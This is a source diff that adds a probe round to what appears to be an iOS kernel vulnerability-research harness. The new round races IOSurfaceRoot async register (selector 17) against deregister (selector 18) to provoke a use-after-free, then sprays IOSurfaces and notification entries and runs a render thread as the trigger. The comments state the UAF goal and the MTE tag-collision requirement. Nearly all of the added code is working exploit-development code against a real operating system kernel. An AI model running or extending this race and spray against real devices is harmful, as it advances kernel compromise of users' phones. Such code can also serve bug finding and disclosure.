@@ -1745,6 +1745,231 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r279: Aggressive sel17/18 async register/deregister race.
+ * Earlier r206 code had the right mechanism but only 50 iterations.
+ * sel17 = IOConnectCallAsyncMethod(conn,17,wp,ref,1,NULL,0,inp,24,...) — async register
+ * sel18 = IOConnectCallMethod(conn,18,NULL,0,inp,24,...) — sync deregister (frees entry)
+ * Race: register creates kernel notification entry, deregister frees it,
+ * but async completion callback still references it → UAF.
+ * MTE 1/15 tag collision needed for spray to land without fault.
+ * This round: 1000 register/deregister races with OOL spray + IOSurface spray. */
+static volatile int r279_render_run = 0;
+static volatile int r279_render_frames = 0;
+
+static void *r279_render_fn(void *arg) {
+    while (r279_render_run) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=320,h=240,bpe=4,bpr=320*4,pf=0x42475241,as=320*240*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        if (s) {
+            IOSurfaceLock(s, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(s);
+            if (base) memset(base, 0x42, 320*240*4);
+            IOSurfaceUnlock(s, 0, NULL);
+            CFRelease(s);
+            __sync_fetch_and_add(&r279_render_frames, 1);
+        }
+    }
+    return NULL;
+}
+
+static void r279_probe(void) {
+    rlog("\n=== r279: Aggressive sel17/18 Async Register/Deregister Race ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("  IOSurfaceRoot svc=%u\n", svc);
+
+    /* Part 1: Verify sel17 async register works */
+    rlog("\n--- Part 1: Verify sel17/sel18 on this iOS version ---\n");
+    {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        rlog("  conn=%u (kr=0x%x)\n", conn, kr);
+
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+        uint64_t ref = 0xAAAA;
+        uint64_t inp[3] = {1, 0, 0};
+
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17 async register: 0x%x\n", kr);
+
+        if (kr == 0) {
+            kern_return_t kr2 = IOConnectCallMethod(conn, 18, NULL, 0,
+                inp, 24, NULL, NULL, NULL, NULL);
+            rlog("  sel18 sync deregister: 0x%x\n", kr2);
+        }
+
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17 re-register: 0x%x\n", kr);
+        if (kr == 0) {
+            IOConnectCallMethod(conn, 18, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        }
+
+        mach_port_deallocate(mach_task_self(), wp);
+        IOServiceClose(conn);
+        fflush(stdout);
+    }
+
+    /* Part 2: Tight race — 500 register/deregister cycles, count anomalies */
+    rlog("\n--- Part 2: Tight register/deregister race (500 cycles) ---\n");
+    {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+
+        int reg_ok = 0, reg_fail = 0, dereg_ok = 0, dereg_fail = 0, anomalies = 0;
+
+        for (int i = 0; i < 500; i++) {
+            mach_port_t wp = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+            uint64_t ref = 0xBBBB + i;
+            uint64_t inp[3] = {1, 2, 3};
+
+            kern_return_t rr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+
+            kern_return_t rd = IOConnectCallMethod(conn, 18, NULL, 0,
+                inp, 24, NULL, NULL, NULL, NULL);
+
+            if (rr == 0) reg_ok++; else reg_fail++;
+            if (rd == 0) dereg_ok++; else dereg_fail++;
+            if (rr != 0 || rd != 0) anomalies++;
+
+            mach_port_deallocate(mach_task_self(), wp);
+        }
+
+        rlog("  reg: ok=%d fail=%d  dereg: ok=%d fail=%d  anomalies=%d\n",
+             reg_ok, reg_fail, dereg_ok, dereg_fail, anomalies);
+        IOServiceClose(conn);
+        fflush(stdout);
+    }
+
+    /* Part 3: Race with spray + render trigger (10 attempts) */
+    rlog("\n--- Part 3: Race + spray + render trigger (10 attempts) ---\n");
+    {
+        CFMutableDictionaryRef spray_props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int sw=64,sh=64,sbpe=4,sbpr=64*4,spf=0x42475241,sas=64*64*4;
+        CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&sw);
+        CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&sh);
+        CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&sbpe);
+        CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&sbpr);
+        CFNumberRef spn=CFNumberCreate(NULL,kCFNumberIntType,&spf);
+        CFNumberRef san=CFNumberCreate(NULL,kCFNumberIntType,&sas);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfaceWidth"),swn);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfaceHeight"),shn);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfaceBytesPerElement"),sbn);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfaceBytesPerRow"),srn);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfacePixelFormat"),spn);
+        CFDictionarySetValue(spray_props,CFSTR("IOSurfaceAllocSize"),san);
+        CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spn);CFRelease(san);
+
+        for (int attempt = 0; attempt < 10; attempt++) {
+            rlog("\n  --- Attempt %d/10 ---\n", attempt+1);
+
+            io_connect_t rc = 0;
+            IOServiceOpen(svc, mach_task_self(), 0, &rc);
+            if (!rc) { rlog("  open failed\n"); continue; }
+
+            int anom = 0;
+            for (int i = 0; i < 200; i++) {
+                mach_port_t wp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref = 0xCC00 + i;
+                uint64_t inp[3] = {1, 2, 3};
+
+                kern_return_t rr = IOConnectCallAsyncMethod(rc, 17, wp, &ref, 1,
+                    NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                kern_return_t rd = IOConnectCallMethod(rc, 18, NULL, 0,
+                    inp, 24, NULL, NULL, NULL, NULL);
+
+                if (rr != 0 || rd != 0) anom++;
+                mach_port_deallocate(mach_task_self(), wp);
+            }
+            rlog("  Race: 200 iters, %d anomalies\n", anom);
+
+            IOSurfaceRef *spray_surfs = calloc(200, sizeof(IOSurfaceRef));
+            int created = 0;
+            for (int i = 0; i < 200; i++) {
+                spray_surfs[i] = IOSurfaceCreate(spray_props);
+                if (spray_surfs[i]) created++;
+            }
+            rlog("  Sprayed %d IOSurfaces\n", created);
+
+            io_connect_t spray_conn = 0;
+            IOServiceOpen(svc, mach_task_self(), 0, &spray_conn);
+            int spray_regs = 0;
+            mach_port_t spray_wps[256];
+            if (spray_conn) {
+                for (int i = 0; i < 256; i++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref = 0xDD00 + i;
+                    uint64_t inp[3] = {(uint64_t)(i+1), 0, 0};
+                    kern_return_t kr = IOConnectCallAsyncMethod(spray_conn, 17, wp, &ref, 1,
+                        NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                    spray_wps[spray_regs] = wp;
+                    if (kr == 0) spray_regs++;
+                    else mach_port_deallocate(mach_task_self(), wp);
+                }
+                rlog("  Sprayed %d registry entries via sel17\n", spray_regs);
+            }
+
+            r279_render_run = 1;
+            r279_render_frames = 0;
+            pthread_t render_t;
+            pthread_create(&render_t, NULL, r279_render_fn, NULL);
+
+            usleep(2000000);
+            r279_render_run = 0;
+            pthread_join(render_t, NULL);
+
+            rlog("  *** SURVIVED attempt %d! frames=%d anomalies=%d ***\n",
+                 attempt+1, r279_render_frames, anom);
+
+            if (spray_conn) {
+                for (int i = 0; i < spray_regs; i++)
+                    mach_port_deallocate(mach_task_self(), spray_wps[i]);
+                IOServiceClose(spray_conn);
+            }
+            for (int i = 0; i < 200; i++)
+                if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+            free(spray_surfs);
+            IOServiceClose(rc);
+        }
+        CFRelease(spray_props);
+        fflush(stdout);
+    }
+
+    IOObjectRelease(svc);
+    rlog("\n*** r279 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r278: Explore IOSurfaceRoot user client types + structured input + API race.
  * r277: ALL selectors return errors with scalar surface ID (0/13.3M success).
  * IOSurface framework passes surface IDs in structured input, not scalars.
@@ -24911,6 +25136,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 279) {
+            rlog("*** rounds=279: Aggressive sel17/18 Async Register/Deregister Race ***\n");
+            rlog("  r278: only type=0 userclient, all struct input fails. App crashed on Lock race.\n");
+            rlog("  Testing: sel17/18 register/deregister, tight race, spray+render trigger.\n\n");
+            fflush(stdout);
+            r279_probe();
             goto done;
         }
         if (rounds == 278) {
